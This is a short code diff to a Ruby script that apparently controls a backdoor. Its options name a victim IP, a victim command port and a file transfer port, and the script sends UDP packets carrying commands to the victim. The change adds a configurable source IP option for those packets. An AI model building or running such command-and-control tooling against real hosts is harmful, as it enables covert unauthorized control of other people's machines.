@@ -22,6 +22,7 @@ where [options] are:
 	EOS
 	
 	opt :host, "Victim IP", :short => "-H", :type => :string, :default => "127.0.0.1" # string --host <s>, default 127.0.0.1
+	opt :src, "Your IP", :short => "-S", :type => :string, :default => "127.0.0.1"
 	opt :cport, "Victim Command Port", :short => "c", :default => 8000 # integer --cport <i>, default 8000
 	opt :rport, "Response Port", :short => "r", :default => 8001 #integer --rpot <i>, default 8001
 	opt :dev, "Victim File Transfer Port", :short => "d", :default => "lo" # integer --dev <s>, default lo
@@ -92,7 +93,7 @@ while 1 do
 		udp.udp_src = rand(0xfff - 1024) + 1024
 		udp.udp_dst = opts[:cport]
 
-		udp.ip_saddr = "127.0.0.1"
+		udp.ip_saddr = opts[:src]
 		udp.ip_daddr = opts[:host]
 
 		udp.payload = hash
